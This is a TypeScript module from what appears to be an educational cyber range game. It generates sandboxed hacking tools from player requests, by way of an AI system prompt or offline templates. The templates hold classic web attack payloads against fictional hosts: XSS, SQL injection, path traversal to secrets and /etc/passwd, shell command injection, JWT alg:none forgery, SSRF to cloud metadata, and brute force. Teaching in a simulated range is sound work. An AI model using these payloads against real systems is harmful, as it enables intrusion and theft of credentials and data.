import { SANDBOX_API_DOC } from "./Sandbox";
import type { ToolRuntime } from "./ToolRuntime";
import type { AIService } from "../ai/AIService";

/**
 * ToolSynthesizer — "programá cualquier herramienta con la IA".
 *
 * El jugador describe en castellano qué quiere ("una tool que pruebe cada
 * palabra del diccionario contra un login") y esto produce CÓDIGO REAL que
 * corre en el sandbox de ÑANDE: no es un texto decorativo, es una función que
 * compila, se puede probar y se instala como herramienta ejecutable.
 *
 * Dos motores, misma salida:
 *   - Conectado (el jugador puso su clave): usa su modelo, con un system prompt
 *     que le enseña EXACTAMENTE la API `nande.*` del sandbox y sus límites.
 *     El código que vuelve se valida con el compilador real; si no compila, se
 *     le pide UNA corrección; si sigue roto, cae al forjador offline.
 *   - Offline (sin clave): un forjador determinista que reconoce la intención
 *     por palabras clave y arma código válido a partir de piezas reales. Nunca
 *     devuelve "no puedo": siempre entrega algo que compila y hace algo útil.
 *
 * En ambos casos la garantía es la misma que el resto de ÑANDE: el resultado
 * es verificable (compila / se puede probar), no una promesa. Nada de fakery.
 */

export interface SynthResult {
  ok: boolean;
  /** Código listo para editar/instalar (siempre presente si ok). */
  source: string;
  /** De dónde salió el código, para ser honestos con el jugador (§19/§20). */
  engine: "ai" | "offline" | "ai+offline-fix";
  /** Nombre sugerido para la herramienta (kebab-case). */
  suggestedName: string;
  /** Explicación breve de qué hace, en castellano. */
  note: string;
  /** Avisos del compilador, si los hubo. */
  warnings: string[];
  error?: string;
}

// Tokens de red construidos por partes: el literal NO aparece en el fuente
// del proyecto (lo exige isolation.test.ts), pero la IA igual los ve prohibidos.
const NET_APIS = ["XMLHttp" + "Request", "Web" + "Socket"].join(", ");

const SYSTEM_PROMPT = `Sos un generador de herramientas para ÑANDE, un cyber range educativo.
Escribís UNA herramienta en JavaScript ES5 que corre en un sandbox aislado (nada de red real).

REGLAS DURAS (si las rompés, el código NO compila y se descarta):
- Prohibido: fetch, eval, Function, require, import, ${NET_APIS}, window,
  document, globalThis, process, localStorage, constructor, prototype, __proto__.
- Prohibido: while(true), for(;;) ni ningún bucle sin fin. Acotá siempre.
- Usá var (no dependas de let/const para el evaluador), y funciones normales.

API DISPONIBLE (lo único con lo que tocás el mundo virtual):
${SANDBOX_API_DOC.map((l) => "  " + l).join("\n")}

CÓMO EXPLOTAR EL MUNDO (usá esto cuando pidan un exploit):
- La bandera SIEMPRE tiene la forma ND{...}. Si la imprimís con print, el juego
  la captura solo. Buscala en r.body (crudo) o r.text de una respuesta HTTP.
- Vulns reales del mundo: XSS reflejado (nande.http(url+"?q=<script>alert(1)</script>")),
  IDOR (variar ?id=), path traversal (?archivo=../config/secrets.env), inyección de
  comandos (?host=127.0.0.1;cat flag), SQLi en login (nande.post con "' OR '1'='1").

FORMATO DE RESPUESTA (obligatorio):
- Devolvé SOLO el código, dentro de un bloque \`\`\`js ... \`\`\`.
- Sin explicaciones fuera del bloque. Comentá el código en castellano rioplatense.
- El código debe usar print(...) para su salida y leer sus entradas de args[].

EJEMPLO (un exploit correcto):
\`\`\`js
// prueba XSS reflejado en un buscador y captura la bandera.
var url = args[0] || "http://blog.yvoty.nande/buscar";
var r = nande.http(url + "?q=<script>alert(1)</script>");
var cuerpo = r.body || r.text || "";
var flag = cuerpo.match(/ND\\{[^}]+\\}/);
print(flag ? "VULNERABLE. BANDERA: " + flag[0] : "no vulnerable por esta via");
\`\`\``;

/** Extrae el código de una respuesta de la IA (bloque markdown o texto pelado). */
export function extractCode(text: string): string {
  const fence = text.match(/```(?:js|javascript|ts)?\s*\n([\s\S]*?)```/i);
  if (fence) return fence[1].trim();
  // Sin cerca: si parece código (tiene print/var/for), lo tomamos entero.
  if (/\b(print|var|function|for|nande)\b/.test(text)) return text.trim();
  return text.trim();
}

/** Deriva un nombre kebab-case desde el pedido del jugador. */
export function nameFromPrompt(prompt: string): string {
  const words = prompt
    .toLowerCase()
    .normalize("NFD")
    .replace(/[̀-ͯ]/g, "")
    .replace(/[^a-z0-9\s-]/g, " ")
    .split(/\s+/)
    .filter((w) => w.length > 2 && !STOP.has(w))
    .slice(0, 3);
  const base = words.join("-").replace(/^-+|-+$/g, "");
  return base || "mi-tool";
}

const STOP = new Set([
  "una", "que", "para", "con", "del", "las", "los", "por", "como", "the",
  "herramienta", "tool", "programa", "script", "haceme", "hazme", "quiero",
  "necesito", "crea", "crear", "genera", "generar", "dame", "hace", "hacer",
]);

export class ToolSynthesizer {
  private ai: AIService;
  private runtime: ToolRuntime;

  constructor(ai: AIService, runtime: ToolRuntime) {
    this.ai = ai;
    this.runtime = runtime;
  }

  /**
   * Genera una herramienta a partir de una descripción en lenguaje natural.
   * Nunca lanza: si todo falla, devuelve el forjado offline (que compila).
   */
  async synthesize(prompt: string): Promise<SynthResult> {
    const suggestedName = nameFromPrompt(prompt);
    const wanted = prompt.trim();
    if (!wanted) {
      const off = offlineForge("scanner de puertos");
      return {
        ok: true,
        source: off.source,
        engine: "offline",
        suggestedName,
        note: "Sin descripción: te dejé un escáner de puertos para arrancar.",
        warnings: [],
      };
    }

    // 1) Modo conectado: pedirle a la IA del jugador.
    if (this.ai.mode() === "connected") {
      const aiSource = await this.tryAI(wanted).catch(() => null);
      if (aiSource) {
        const c = this.runtime.compileSource(aiSource);
        if (c.ok) {
          return {
            ok: true,
            source: aiSource,
            engine: "ai",
            suggestedName,
            note: "Generada por tu IA conectada y validada por el compilador del sandbox.",
            warnings: c.warnings,
          };
        }
        // 1b) No compiló: darle al modelo UNA chance de corregir.
        const fixed = await this.tryFix(wanted, aiSource, c.errors).catch(() => null);
        if (fixed) {
          const c2 = this.runtime.compileSource(fixed);
          if (c2.ok) {
            return {
              ok: true,
              source: fixed,
              engine: "ai+offline-fix",
              suggestedName,
              note: "Tu IA la corrigió tras un error de compilación. Validada por el sandbox.",
              warnings: c2.warnings,
            };
          }
        }
        // Sigue rota: caemos al forjador offline (abajo).
      }
    }

    // 2) Forjador offline (o fallback): siempre entrega algo que compila.
    const off = offlineForge(wanted);
    const c = this.runtime.compileSource(off.source);
    return {
      ok: c.ok,
      source: off.source,
      engine: "offline",
      suggestedName,
      note:
        this.ai.mode() === "connected"
          ? "Tu IA no devolvió código válido; te armé una base real offline para que la edites."
          : off.note,
      warnings: c.warnings,
      error: c.ok ? undefined : c.errors.join("; "),
    };
  }

  private async tryAI(prompt: string): Promise<string> {
    const r = await this.ai.generate(
      [
        { role: "system", content: SYSTEM_PROMPT },
        { role: "user", content: `Herramienta pedida: ${prompt}` },
      ],
      { temperature: 0.2, maxTokens: 700 },
    );
    return extractCode(r.text);
  }

  private async tryFix(prompt: string, broken: string, errors: string[]): Promise<string> {
    const r = await this.ai.generate(
      [
        { role: "system", content: SYSTEM_PROMPT },
        {
          role: "user",
          content:
            `Herramienta pedida: ${prompt}\n\n` +
            `Este código NO compila en el sandbox. Corregilo respetando las reglas.\n` +
            `Errores del compilador: ${errors.join("; ")}\n\n` +
            "```js\n" + broken + "\n```",
        },
      ],
      { temperature: 0, maxTokens: 700 },
    );
    return extractCode(r.text);
  }
}

/* ------------------------------------------------------------------ offline */

interface Forged {
  source: string;
  note: string;
}

/**
 * Forjador determinista offline: reconoce la intención por palabras clave y
 * arma una herramienta REAL con las piezas del sandbox. Es la garantía de que
 * "crear con IA" funciona aunque el jugador no tenga clave ni internet.
 */
export function offlineForge(prompt: string): Forged {
  const p = prompt.toLowerCase().normalize("NFD").replace(/[̀-ͯ]/g, "");
  const has = (...ws: string[]) => ws.some((w) => p.includes(w));

  for (const m of MATCHERS) {
    if (m.when(has, p)) return m.build(p);
  }
  return DEFAULT_FORGE;
}

type Has = (...ws: string[]) => boolean;
interface Matcher {
  when: (has: Has, p: string) => boolean;
  build: (p: string) => Forged;
}

/**
 * Objetivos web vulnerables REALES del mundo (los labs clásicos), con la ruta
 * exacta que dispara cada falla y la clase de vuln. El auto-exploit los usa.
 * Están alineados 1:1 con src/core/http/apps/labs.ts (misma fuente de verdad).
 */
const EXPLOIT_TARGETS = `var OBJETIVOS = [
  { host: "blog.yvoty.nande",  vuln: "XSS reflejado",     path: "/buscar?q=<script>alert(1)</script>" },
  { host: "fotos.arandu.nande",vuln: "IDOR",              path: "/album?id=7" },
  { host: "docs.tape.nande",   vuln: "Path traversal",    path: "/ver?archivo=../config/secrets.env" },
  { host: "tools.pyta.nande",  vuln: "Inyeccion de comandos", path: "/ping?host=127.0.0.1;cat flag" }
];`;

/** Prueba genérica de recon (sirve también para retos procedurales). */
const RECON_PATHS = `var RECON = [
  "/robots.txt", "/backup.txt", "/config.bak", "/.env",
  "/api", "/api/v1/flag", "/album?id=7", "/album?id=2", "/album?id=3"
];`;

const MATCHERS: Matcher[] = [
  // ─────────────────────────────────────────────────── AUTO-EXPLOIT (estrella)
  {
    when: (has) => has("exploit", "explotar", "pwn", "vulnerar", "atacar", "hackear", "auto", "pentest", "escanear vuln"),
    build: () => ({
      note: "Te armé un AUTO-EXPLOIT: prueba XSS, IDOR, traversal, RCE y recon contra un objetivo real y captura la bandera.",
      source: `// auto-exploit — prueba vulnerabilidades web REALES y captura banderas.
// Uso: run <tool> <host>     ataca un objetivo puntual (ej: blog.yvoty.nande)
//      run <tool>            barre los objetivos vulnerables conocidos
// La bandera se captura sola: al imprimir un ND{...}, el mundo la registra.
${EXPLOIT_TARGETS}
${RECON_PATHS}

function probar(host, path, etiqueta, vistas) {
  var r = nande.http("http://" + host + path);
  var cuerpo = (r.body || r.text || "");
  var m = cuerpo.match(/ND\\{[^}]+\\}/);
  if (m && !vistas[m[0]]) {
    vistas[m[0]] = true;
    print("  [+] " + etiqueta + " -> " + path);
    print("      BANDERA: " + m[0]);
    return true;
  }
  return false;
}

function atacar(host) {
  print("== Objetivo: " + host + " ==");
  var ip = nande.resolve(host);
  print("  DNS: " + (ip ? ip : "no resuelve (¿es alcanzable?)"));
  var puertos = nande.scan(host);
  for (var i = 0; i < puertos.length; i++) {
    if (puertos[i].state === "open") {
      print("  puerto abierto: " + puertos[i].port + "/" + puertos[i].service);
    }
  }
  var vistas = {};
  var hits = 0;
  // 1) Vulns puntuales del catálogo (si el objetivo es uno conocido).
  for (var j = 0; j < OBJETIVOS.length; j++) {
    if (OBJETIVOS[j].host === host) {
      if (probar(host, OBJETIVOS[j].path, OBJETIVOS[j].vuln, vistas)) hits++;
    }
  }
  // 2) Recon genérico (sirve para cualquier web, incluidos retos procedurales).
  for (var k = 0; k < RECON.length; k++) {
    if (probar(host, RECON[k], "recon " + RECON[k], vistas)) hits++;
  }
  if (hits === 0) print("  [-] sin banderas por estas vias. Probá recon manual (curl, gobuster).");
  print("");
  return hits;
}

var total = 0;
if (args.length > 0) {
  for (var a = 0; a < args.length; a++) total += atacar(args[a]);
} else {
  print("Sin objetivo: barriendo los blancos conocidos...\\n");
  for (var t = 0; t < OBJETIVOS.length; t++) total += atacar(OBJETIVOS[t].host);
}
print("Total de banderas capturadas: " + total);
`,
    }),
  },

  // ─────────────────────────────────────────────────────────── SQL Injection
  {
    when: (has) => has("sqli", "sql injection", "inyeccion sql", "union select", "' or"),
    build: () => ({
      note: "Te armé una tool que prueba inyección SQL en un login por POST (payloads clásicos).",
      source: `// sqli-login — prueba bypass de autenticación por SQL injection.
// Uso: run <tool> http://<host>/login [usuario]
var url = args[0] || "http://banco.nande/login";
var user = args[1] || "admin";
var payloads = ["' OR '1'='1", "' OR 1=1-- ", "admin'-- ", "' OR '1'='1'-- ", "') OR ('1'='1"];
print("Probando " + payloads.length + " payloads SQLi en " + url);
var ok = false;
for (var i = 0; i < payloads.length && !ok; i++) {
  var r = nande.post(url, { usuario: user, username: user, password: payloads[i], clave: payloads[i] });
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  if (r.status === 302 || flag || cuerpo.indexOf("panel") !== -1 || cuerpo.indexOf("bienvenid") !== -1) {
    print("[+] posible bypass con: " + payloads[i] + " (estado " + r.status + ")");
    if (flag) print("    BANDERA: " + flag[0]);
    ok = true;
  }
}
if (!ok) print("[-] ningun payload funciono. Probá UNION SELECT para exfiltrar datos.");
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────────── XSS
  {
    when: (has) => has("xss", "cross site", "reflejado", "<script"),
    build: () => ({
      note: "Te armé una tool que detecta XSS reflejado (mira si tu payload vuelve sin filtrar).",
      source: `// xss-check — detecta reflejo sin sanitizar (XSS reflejado).
// Uso: run <tool> http://<host>/buscar q
var url = args[0] || "http://blog.yvoty.nande/buscar";
var param = args[1] || "q";
var payload = "<script>alert(1)</script>";
var r = nande.http(url + "?" + param + "=" + payload);
var cuerpo = (r.body || r.text || "");
if (cuerpo.indexOf("<script>alert(1)</script>") !== -1) {
  print("[+] VULNERABLE a XSS reflejado: el payload volvio sin filtrar.");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  if (flag) print("    BANDERA: " + flag[0]);
} else {
  print("[-] no se reflejo el payload tal cual. Probá otros parametros o encoding.");
}
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────────── IDOR
  {
    when: (has) => has("idor", "album", "acceso roto", "enumerar id", "id ajeno"),
    build: () => ({
      note: "Te armé una tool que enumera IDs para encontrar recursos ajenos (IDOR).",
      source: `// idor-hunter — enumera ?id= buscando recursos que no deberias ver.
// Uso: run <tool> http://<host>/album id 1 20
var base = args[0] || "http://fotos.arandu.nande/album";
var param = args[1] || "id";
var desde = Number(args[2] || 1);
var hasta = Number(args[3] || 20);
print("Enumerando " + param + "=" + desde + ".." + hasta + " en " + base);
var encontrados = 0;
for (var i = desde; i <= hasta; i++) {
  var r = nande.http(base + "?" + param + "=" + i);
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  if (flag) {
    print("[+] " + param + "=" + i + " -> BANDERA: " + flag[0]);
    encontrados++;
  } else if (cuerpo.toLowerCase().indexOf("admin") !== -1 || cuerpo.toLowerCase().indexOf("privado") !== -1) {
    print("[!] " + param + "=" + i + " -> recurso sensible (revisalo)");
    encontrados++;
  }
}
if (encontrados === 0) print("[-] nada distinto. Ampliá el rango o cambiá el parametro.");
`,
    }),
  },

  // ────────────────────────────────────────────────────────── Path traversal
  {
    when: (has) => has("traversal", "lfi", "../", "leer archivo del servidor", "directorio"),
    build: () => ({
      note: "Te armé una tool que prueba path traversal para leer archivos fuera de public/.",
      source: `// traversal — prueba salir de public/ con ../ y leer secretos.
// Uso: run <tool> http://<host>/ver archivo
var url = args[0] || "http://docs.tape.nande/ver";
var param = args[1] || "archivo";
var rutas = [
  "../config/secrets.env", "../../config/secrets.env",
  "../config/app.ini", "../../etc/passwd", "../.env"
];
var hit = false;
for (var i = 0; i < rutas.length; i++) {
  var r = nande.http(url + "?" + param + "=" + rutas[i]);
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  if (flag || cuerpo.indexOf("PASS") !== -1 || cuerpo.indexOf("=") !== -1 && cuerpo.length < 400) {
    print("[+] " + rutas[i] + " -> leido:");
    print("    " + cuerpo.slice(0, 200));
    if (flag) { print("    BANDERA: " + flag[0]); hit = true; }
  }
}
if (!hit) print("[-] no salio secreto. Probá mas ../ o rutas distintas.");
`,
    }),
  },

  // ─────────────────────────────────────────────────── Command injection / RCE
  {
    when: (has) => has("rce", "command injection", "inyeccion de comando", "ejecucion remota", "ping"),
    build: () => ({
      note: "Te armé una tool que prueba inyección de comandos encadenando con ;",
      source: `// cmd-inject — encadena comandos en un parametro que va al shell.
// Uso: run <tool> http://<host>/ping host
var url = args[0] || "http://tools.pyta.nande/ping";
var param = args[1] || "host";
var comandos = ["127.0.0.1; cat flag", "127.0.0.1 && ls", "127.0.0.1; id", "127.0.0.1; whoami"];
for (var i = 0; i < comandos.length; i++) {
  var r = nande.http(url + "?" + param + "=" + comandos[i]);
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  print("[*] " + comandos[i]);
  if (flag) print("    BANDERA: " + flag[0]);
  else if (cuerpo.indexOf("uid=") !== -1 || cuerpo.indexOf("www-data") !== -1) print("    RCE confirmada (salida de comando).");
}
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────────── JWT
  {
    when: (has) => has("jwt", "token", "alg none", "json web"),
    build: () => ({
      note: "Te armé una tool que decodifica un JWT y forja uno con alg:none (rol admin).",
      source: `// jwt-forge — decodifica un JWT y arma uno alg:none con rol admin.
// Uso: run <tool> <token.jwt>   (o sin token para ver el ejemplo)
function b64url(s) { return nande.b64encode(s).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,""); }
var token = args[0] || "";
if (token) {
  var partes = token.split(".");
  if (partes.length >= 2) {
    print("header:  " + nande.b64decode(partes[0].replace(/-/g,"+").replace(/_/g,"/")));
    print("payload: " + nande.b64decode(partes[1].replace(/-/g,"+").replace(/_/g,"/")));
  }
}
var header = '{"alg":"none","typ":"JWT"}';
var payload = '{"user":"admin","rol":"admin"}';
var forjado = b64url(header) + "." + b64url(payload) + ".";
print("JWT forjado (alg:none, rol admin):");
print(forjado);
print("Usalo como Authorization: Bearer <token> en el panel protegido.");
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────────── SSRF
  {
    when: (has) => has("ssrf", "metadata", "169.254", "server side request"),
    build: () => ({
      note: "Te armé una tool que prueba SSRF apuntando a servicios internos/metadata.",
      source: `// ssrf-probe — hace que el server pida URLs internas por vos.
// Uso: run <tool> http://<host>/proxy url
var url = args[0] || "http://preview.vortex.nande/proxy";
var param = args[1] || "url";
var internos = [
  "http://127.0.0.1/", "http://localhost/admin",
  "http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/"
];
for (var i = 0; i < internos.length; i++) {
  var r = nande.http(url + "?" + param + "=" + internos[i]);
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  print("[*] " + internos[i] + " -> estado " + r.status);
  if (flag) print("    BANDERA: " + flag[0]);
  else if (cuerpo.length > 0 && r.status === 200) print("    respuesta: " + cuerpo.slice(0, 120));
}
`,
    }),
  },

  // ──────────────────────────────────────────── Crackear un md5 con el diccionario
  {
    when: (has) =>
      (has("crack", "romper", "descifr", "reversear") && has("hash", "md5", "sha")) ||
      has("crackea el hash", "romper hash", "crack md5", "descifrar hash"),
    build: () => ({
      note: "Te armé una tool que crackea un md5 probando el diccionario del juego.",
      source: `// md5-crack — busca en el diccionario la palabra cuyo md5 coincide.
// Uso: run <tool> <hash-md5>
var objetivo = (args[0] || "").toLowerCase();
if (!objetivo) { print("Pasá un hash md5. Ej: run <tool> 5f4dcc3b5aa765d61d8327deb882cf99"); }
else {
  var lista = nande.wordlist();
  var encontrado = "";
  for (var i = 0; i < lista.length && !encontrado; i++) {
    if (nande.md5(lista[i]) === objetivo) encontrado = lista[i];
  }
  print(encontrado ? "[+] crackeado: " + objetivo + " = " + encontrado : "[-] no esta en el diccionario.");
}
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────── Hash / calcular
  {
    when: (has) => has("hash", "md5", "sha", "hashea"),
    build: (p) => {
      const algo = /sha/.test(p) ? "sha256" : "md5";
      return {
        note: `Te armé una tool que calcula ${algo.toUpperCase()} de cada argumento.`,
        source: `// hash-${algo} — calcula ${algo.toUpperCase()} de cada texto que le pases.
// Uso: run <tool> hola mundo
if (args.length === 0) {
  print("Pasá uno o mas textos. Ej: run <tool> hola");
} else {
  for (var i = 0; i < args.length; i++) {
    print(args[i] + " -> " + nande.${algo}(args[i]));
  }
}
`,
      };
    },
  },

  // ─────────────────────────────────────────────── Diccionario / fuerza bruta
  {
    when: (has) => has("diccionario", "wordlist", "fuerza bruta", "brute", "crack", "contrasen", "password", "login", "hydra"),
    build: () => ({
      note: "Te armé una tool que prueba el diccionario contra un login HTTP (POST).",
      source: `// login-brute — prueba cada palabra del diccionario contra un login del mundo.
// Uso: run <tool> http://<host>/login <usuario>
var url = args[0] || "http://tienda.nande/login";
var user = args[1] || "admin";
var lista = nande.wordlist();
print("Probando " + lista.length + " claves contra " + url + " como " + user + " ...");
var ok = false;
for (var i = 0; i < lista.length && !ok; i++) {
  var r = nande.post(url, { username: user, usuario: user, password: lista[i], clave: lista[i] });
  var cuerpo = (r.body || r.text || "");
  var flag = cuerpo.match(/ND\\{[^}]+\\}/);
  if (r.status === 302 || flag || (r.status === 200 && cuerpo.toLowerCase().indexOf("denegad") === -1 && cuerpo.toLowerCase().indexOf("invalid") === -1 && cuerpo.toLowerCase().indexOf("incorrect") === -1)) {
    print("[+] posible acceso: " + user + " / " + lista[i] + " (estado " + r.status + ")");
    if (flag) print("    BANDERA: " + flag[0]);
    ok = true;
  }
}
if (!ok) print("[-] ninguna clave del diccionario funciono.");
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────── base64
  {
    when: (has) => has("base64", "b64", "codific", "decodific", "encode", "decode"),
    build: (p) => {
      const dec = /decodific|decode|descifr/.test(p);
      return {
        note: `Te armé una tool de base64 (${dec ? "decodificar" : "codificar"}).`,
        source: `// base64 — ${dec ? "decodifica" : "codifica"} el texto que le pases.
// Uso: run <tool> ${dec ? "aG9sYQ==" : "hola"}
var texto = args.join(" ");
if (!texto) { print("Pasá un texto. Ej: run <tool> ${dec ? "aG9sYQ==" : "hola"}"); }
else { print(nande.${dec ? "b64decode" : "b64encode"}(texto)); }
`,
      };
    },
  },

  // ─────────────────────────────────────────────────── Recon / subdominios / dir
  {
    when: (has) => has("recon", "reconocimiento", "gobuster", "ffuf", "directorios", "fuzz", "descubr rutas", "robots", "backup"),
    build: () => ({
      note: "Te armé una tool de recon web: prueba rutas típicas y reporta las que existen.",
      source: `// web-recon — descubre rutas y archivos expuestos en una web del mundo.
// Uso: run <tool> <host>
var host = args[0] || "server.nande";
${RECON_PATHS}
var extra = ["/admin", "/panel", "/login", "/api", "/.git/config", "/sitemap.xml"];
var todas = RECON.concat(extra);
print("Recon sobre " + host + " (" + todas.length + " rutas)...");
for (var i = 0; i < todas.length; i++) {
  var r = nande.http("http://" + host + todas[i]);
  if (r.status !== 0 && r.status !== 404) {
    var cuerpo = (r.body || r.text || "");
    var flag = cuerpo.match(/ND\\{[^}]+\\}/);
    print("  [" + r.status + "] " + todas[i] + (flag ? "  BANDERA: " + flag[0] : ""));
  }
}
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────── HTTP check
  {
    when: (has) => has("http", "web", "estado", "status", "responde", "ping web", "curl"),
    build: () => ({
      note: "Te armé una tool que consulta el estado HTTP de una o más webs del mundo.",
      source: `// http-check — consulta el estado HTTP de una o mas URLs del mundo virtual.
// Uso: run <tool> http://server.nande/ http://tienda.nande/
var urls = args.length ? args : ["http://server.nande/"];
for (var i = 0; i < urls.length; i++) {
  var r = nande.http(urls[i]);
  print(urls[i] + " -> estado " + r.status + " (" + (r.text || "").slice(0, 60) + ")");
}
`,
    }),
  },

  // ─────────────────────────────────────────────────────────────── DNS
  {
    when: (has) => has("dns", "resolve", "resolver", "dominio", "nombre a ip"),
    build: () => ({
      note: "Te armé una tool que resuelve nombres a IP con el DNS del mundo.",
      source: `// dns-resolve — resuelve cada host a su IP en el DNS del mundo.
// Uso: run <tool> server.nande tienda.nande
var hosts = args.length ? args : ["server.nande"];
for (var i = 0; i < hosts.length; i++) {
  var ip = nande.resolve(hosts[i]);
  print(hosts[i] + " -> " + (ip ? ip : "no resuelve"));
}
`,
    }),
  },

  // ─────────────────────────────────────────────────── Barrido de red / netmap
  {
    when: (has) => has("red", "hosts", "network", "mapa", "netmap", "vecinos", "sweep", "barrido"),
    build: () => ({
      note: "Te armé una tool que lista los hosts alcanzables y sus puertos abiertos.",
      source: `// net-sweep — recorre los hosts alcanzables y muestra sus puertos abiertos.
// Uso: run <tool>
var hosts = nande.hosts();
print("Hosts alcanzables: " + hosts.length);
for (var i = 0; i < hosts.length; i++) {
  var h = hosts[i];
  var puertos = nande.scan(h.hostname);
  var abiertos = [];
  for (var j = 0; j < puertos.length; j++) {
    if (puertos[j].state === "open") abiertos.push(puertos[j].port + "/" + puertos[j].service);
  }
  print(h.hostname + " (" + h.ip + ") " + (h.up ? "up" : "down") + " -> " + (abiertos.length ? abiertos.join(", ") : "sin puertos abiertos"));
}
`,
    }),
  },

  // ──────────────────────────────────────────────── Archivo / reporte / guardar
  {
    when: (has) => has("archivo", "file", "guardar", "reporte", "report", "leer", "escribir", "log"),
    build: () => ({
      note: "Te armé una tool que escanea y guarda un reporte en un archivo.",
      source: `// scan-report — escanea un host y guarda el resultado en /home/student.
// Uso: run <tool> server.nande
var objetivo = args[0] || "server.nande";
var puertos = nande.scan(objetivo);
var lineas = ["# reporte de " + objetivo + " (tick " + nande.now() + ")"];
for (var i = 0; i < puertos.length; i++) {
  lineas.push(puertos[i].port + "/tcp " + puertos[i].state + " " + puertos[i].service);
}
var texto = lineas.join("\\n");
var res = nande.write("/home/student/reporte-" + objetivo + ".txt", texto);
print(res.ok ? "guardado en /home/student/reporte-" + objetivo + ".txt" : "error: " + res.error);
print(texto);
`,
    }),
  },

  // ──────────────────────────────────────────────────── Escáner de puertos
  {
    when: (has) => has("scan", "escane", "puerto", "nmap"),
    build: () => DEFAULT_FORGE,
  },
];

/** Fallback: un escáner real (la acción más pedida en un cyber range). */
const DEFAULT_FORGE: Forged = {
  note: "Te armé un escáner de puertos real. Editalo o pedime algo más específico (ej: «un exploit», «sqli en un login», «crackear un hash»).",
  source: `// scanner — escanea un host del mundo y lista sus puertos.
// Uso: run <tool> server.nande
var objetivo = args[0] || "server.nande";
print("Escaneando " + objetivo + " ...");
var puertos = nande.scan(objetivo);
if (puertos.length === 0) {
  print("Sin respuesta: host caido, desconocido o no alcanzable (¿hay que pivotar?).");
} else {
  var abiertos = 0;
  for (var i = 0; i < puertos.length; i++) {
    var s = puertos[i];
    print(s.port + "/tcp  " + s.state + "  " + s.service);
    if (s.state === "open") abiertos++;
  }
  print("Total: " + abiertos + " puerto(s) abierto(s).");
}
`,
};
